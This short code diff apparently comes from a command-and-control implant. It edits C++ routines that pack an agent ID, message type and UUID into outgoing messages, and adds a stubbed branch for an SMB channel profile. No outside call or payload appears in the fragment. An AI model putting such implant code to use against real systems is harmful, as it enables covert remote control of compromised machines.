@@ -478,8 +478,6 @@ auto DECLFN Package::Wstr(
     return this->Bytes( package, (BYTE*) data, Str::LengthW( data ) * 2 );
 }
 
-#define KH_MESSAGE_ID 
-
 auto DECLFN Package::SendOut(
     _In_ CHAR* UUID,
     _In_ ULONG CmdID,
@@ -517,8 +515,12 @@ auto DECLFN Package::SendMsg(
     Package->Buffer = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
     Package->Length = 0;
 
-    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
+    this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
     this->Byte( Package, KhQuickMsg );
+
+    if ( PROFILE_C2 == PROFILE_SMB ) {
+        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
+    }
 
     this->Pad( Package, (UCHAR*)UUID, 36 );
     this->Int32( Package, Type );
